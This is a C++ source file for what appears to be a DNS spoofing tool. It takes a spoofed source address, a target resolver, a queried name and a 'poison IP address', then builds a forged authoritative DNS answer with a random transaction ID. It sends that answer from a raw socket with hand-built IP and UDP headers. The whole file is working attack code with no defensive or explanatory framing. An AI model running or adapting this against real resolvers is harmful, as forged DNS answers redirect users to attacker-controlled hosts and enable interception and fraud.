#include <iostream>
#include <string>

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <getopt.h>
#include <time.h>

#include <sys/select.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/time.h>
#include <sys/socket.h>

#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#if defined(__linux__) || defined(__FreeBSD__)
#include <arpa/nameser.h>
#else
#include <nameser.h>
#endif

#include <resolv.h>

#include "utils.hpp"
#include "name_pkt.hpp"
#include "pkt_buffer.hpp"

#define SA struct sockaddr
#define SAIN struct sockaddr_in

void usage(char* prog_name);
int   get_resolver_count(void);
char* get_resolver_name(int i);

extern bool debug;

int
main(int argc, char** argv)
{
    int opt;
    int option_index;

    const int on  = 1;
    const int off = 0;
    int err;

    debug = true;

    std::string opt_d;
    std::string opt_a;
    std::string opt_r;
    std::string opt_s;

    struct option long_options[] = {
        {"help" ,  no_argument,       NULL, 'h'},
        {"dst",    required_argument, NULL, 'd'},
        {"src",    required_argument, NULL, 's'},
        {"ans",    required_argument, NULL, 'a'},
        {"req",    required_argument, NULL, 'r'},
        {0, 0, 0, 0}
    };

    while ((opt = getopt_long(argc, argv, "a:r:d:s:?h", long_options, &option_index)) != -1) {
        switch (opt) {
            case 'h':
                usage(argv[0]);
                exit(EXIT_FAILURE);
                break;
            case 'd':
                opt_d = optarg;
                break;
            case 's':
                opt_s = optarg;
                break;
            case 'a':
                opt_a = optarg;
                break;
            case 'r':
                opt_r = optarg;
                break;
            case '?':
                exit(EXIT_FAILURE);
                break;
            default:
                exit(EXIT_FAILURE);
        }
    }

    if (opt_d.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    } else if (!is_ipv4_address(opt_d)) {
        usage(argv[0]);
        printf("(-d) the destination IP address was not parseable string.\n");
        exit(EXIT_FAILURE);
    }

    if (opt_s.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    } else if (!is_ipv4_address(opt_s)) {
        usage(argv[0]);
        printf("(-s) the source IP address was not parseable string.\n");
        exit(EXIT_FAILURE);
    }

    if (opt_a.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    } else if (!is_ipv4_address(opt_a)) {
        usage(argv[0]);
        printf("(-a) the poison IP address was not parseable string.\n");
        exit(EXIT_FAILURE);
    }

    if (opt_r.size() == 0) {
        usage(argv[0]);
        exit(EXIT_FAILURE);
    }

    srand(time(NULL));

    // open raw socket
    int fd;

    char buffer[BUFSIZ];
    memset(buffer, 0, sizeof(buffer));

    auto pb = new pkt_buffer;
    pb->set_buffer(buffer, sizeof(buffer));
    pb->set_iphdr(opt_s, opt_d);
    pb->set_udphdr(53, (uint16_t)rand());

    auto np = new name_pkt;
    np->n_set_id((uint16_t)rand());
    np->n_set_flags(QR|AA|RD|RA);
    np->n_create_rr_questionA(opt_r);
    np->n_create_rr_answer(opt_a);
    np->n_build_payload();

    memdump((void*)np->n_payload(), np->n_payload_size());

    pb->set_payload(np->n_payload(), np->n_payload_size());
    pb->post_processing();

    struct sockaddr_in sin = pb->get_src_sockaddr();

    fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (fd < 0) {
        PERROR("socket");
        exit(EXIT_FAILURE);
    }

    err = setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on));
    if (err < 0)
    {
        PERROR("setsockopt");
        exit(EXIT_FAILURE);
    }

    //ssize_t send_size = sendto(fd, buffer, buffer_size, MSG_DONTROUTE, (struct sockaddr*)&sin, sizeof(sin));
    ssize_t send_size = sendto(fd, pb->get_buffer(), pb->get_payload_size(), 0, (struct sockaddr*)&sin, sizeof(sin));
    if (send_size < 0 ) {
        PERROR("snedto");
        exit(EXIT_FAILURE);
    }

    return 0;
}

//--

void usage(char* prog_name)
{
    printf("%s -s [source address] -d [destination address] -a [ans address] -r [req name]\n", prog_name);
    return;
}

char* get_resolver_name(int i)
{
    struct sockaddr_in sin;
    memcpy(&sin, &(_res.nsaddr_list[i]), sizeof(struct sockaddr_in));
    return inet_ntoa(sin.sin_addr);
}

int get_resolver_count(void)
{
    return _res.nscount;
}
